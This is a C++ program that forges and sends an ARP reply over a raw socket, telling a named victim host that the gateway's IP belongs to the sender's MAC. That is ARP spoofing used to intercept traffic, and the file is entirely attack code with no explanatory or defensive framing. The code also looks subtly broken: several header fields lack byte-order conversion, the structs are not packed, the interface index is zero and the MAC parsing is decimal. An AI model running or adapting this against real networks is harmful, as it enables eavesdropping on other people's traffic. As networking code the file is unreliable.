#include <cstdint>
#include <iostream>
#include <sstream>
#include <vector>
#include <stdexcept>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>
#include <netpacket/packet.h>

struct ARPPacket {
    std::uint16_t hardwareType;
    std::uint16_t protocolType;
    std::uint8_t hardwareAddrLength;
    std::uint8_t protocolAddrLength;
    std::uint16_t operation;
    std::uint8_t senderHardwareAddr[6];
    std::uint8_t senderProtocolAddr[4];
    std::uint8_t targetHardwareAddr[6];
    std::uint8_t targetProtocolAddr[4];
};

struct EthPacket {
    std::uint8_t destMac[6];
    std::uint8_t srcMac[6];
    std::uint16_t ethType;
    ARPPacket arpPacket;
};

std::vector<std::string> explode(const std::string &str, char delimiter) 
{
    std::vector<std::string> result;
    std::istringstream stringStream(str);
    std::string token;
    
    while (std::getline(stringStream, token, delimiter)) {
        result.push_back(token);
    }
    
    return result;
}

void copyStringVectorToUintArray(const std::vector<std::string> &stringVector, std::uint8_t *array, int arraySize)
{
    std::vector<std::string>::size_type formattedArraySize = static_cast<std::vector<std::string>::size_type>(arraySize);

    if (stringVector.size() != formattedArraySize) {
        throw std::runtime_error("Invalid string/array size");
    }

    for (int i = 0; i < arraySize; ++i) {
        array[i] = static_cast<std::uint8_t>(std::stoi(stringVector[i]));
    }
}

int main(int argc, char* argv[]) 
{
    std::vector<std::string> victimMac = explode(argv[1], '.');
    std::vector<std::string> victimIp = explode(argv[2], '.');
    std::vector<std::string> gatewayMac = explode(argv[3], '.');
    std::vector<std::string> gatewayIp = explode(argv[4], '.');
    std::vector<std::string> localMac = explode(argv[5], '.');

    ARPPacket arpPacket;
    arpPacket.hardwareType = 1;
    arpPacket.protocolType = 0x0800;
    arpPacket.hardwareAddrLength = 6;
    arpPacket.protocolAddrLength = 4;
    arpPacket.operation = 2;

    // Build packet for victim    
    copyStringVectorToUintArray(localMac, arpPacket.senderHardwareAddr, 6);
    copyStringVectorToUintArray(gatewayIp, arpPacket.senderProtocolAddr, 4);
    copyStringVectorToUintArray(victimMac, arpPacket.targetHardwareAddr, 6);
    copyStringVectorToUintArray(victimIp, arpPacket.targetProtocolAddr, 4);

    EthPacket ethPacket;
    copyStringVectorToUintArray(victimMac, ethPacket.destMac, 6);
    copyStringVectorToUintArray(localMac, ethPacket.srcMac, 6);
    ethPacket.ethType = htons(ETH_P_ARP);

    // Include ARP packet in the Ethernet (ETH) packet
    std::memcpy(&ethPacket.arpPacket, &arpPacket, sizeof(ARPPacket));

    struct sockaddr_ll sa;
    std::memset(&sa, 0, sizeof(sa));

    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = 0;

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd == -1) {
        std::cerr << "Failed to create packet" << std::endl;

        return -1;
    }

    if (sendto(sockfd, &ethPacket, sizeof(ethPacket), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
        std::cerr << "Failed to send ARP packet" << std::endl;
    } else {
        std::cout << "ARP packet sent successfully" << std::endl;
    }

    close(sockfd);

    return 0;
}
